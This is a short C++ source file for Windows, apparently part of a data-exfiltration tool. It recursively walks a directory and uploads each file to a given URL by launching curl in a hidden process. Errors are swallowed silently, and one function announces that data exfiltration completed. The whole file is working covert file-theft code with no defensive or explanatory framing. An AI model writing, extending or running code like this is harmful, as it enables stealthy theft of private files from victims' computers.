#include "exfiltrator.h"
#include <iostream>
#include <filesystem>
#include <windows.h>
#include <sstream>
#include <queue>


void exfiltrateFile(const std::string& filePath, const std::string& targetURL) {
    try {
        STARTUPINFOA si = { sizeof(STARTUPINFOA) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE; // Ensure no window is shown

        PROCESS_INFORMATION pi;
        std::string command = "curl --upload-file \"" + filePath + "\" " + targetURL;

        if (!CreateProcessA(NULL, &command[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            return; // Silent failure
        }

        WaitForSingleObject(pi.hProcess, INFINITE); // Wait for the process to complete
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

    } catch (...) {
        // Handle exceptions silently
    }
}
void gatherFilesAndExfiltrate(const std::string& directoryPath, const std::string& targetURL) {
    for (const auto& entry : std::filesystem::recursive_directory_iterator(directoryPath)) {
        if (entry.is_regular_file()) {
            exfiltrateFile(entry.path().string(), targetURL);
        }
    }
}


void ManualDataExfil(const std::string& directoryPath, const std::string& targetURL) {
    try {
        gatherFilesAndExfiltrate(directoryPath, targetURL);
        std::cout << "[INFO] Data exfiltration completed successfully." << std::endl;
    } catch (const std::exception& e) {
        std::cerr << "[ERROR] Data exfiltration failed: " << e.what() << std::endl;
    } catch (...) {
        std::cerr << "[ERROR] Unknown error during data exfiltration." << std::endl;
    }
}
// extern std::queue<std::string> fileQueue;
// extern std::mutex exfilMutex;
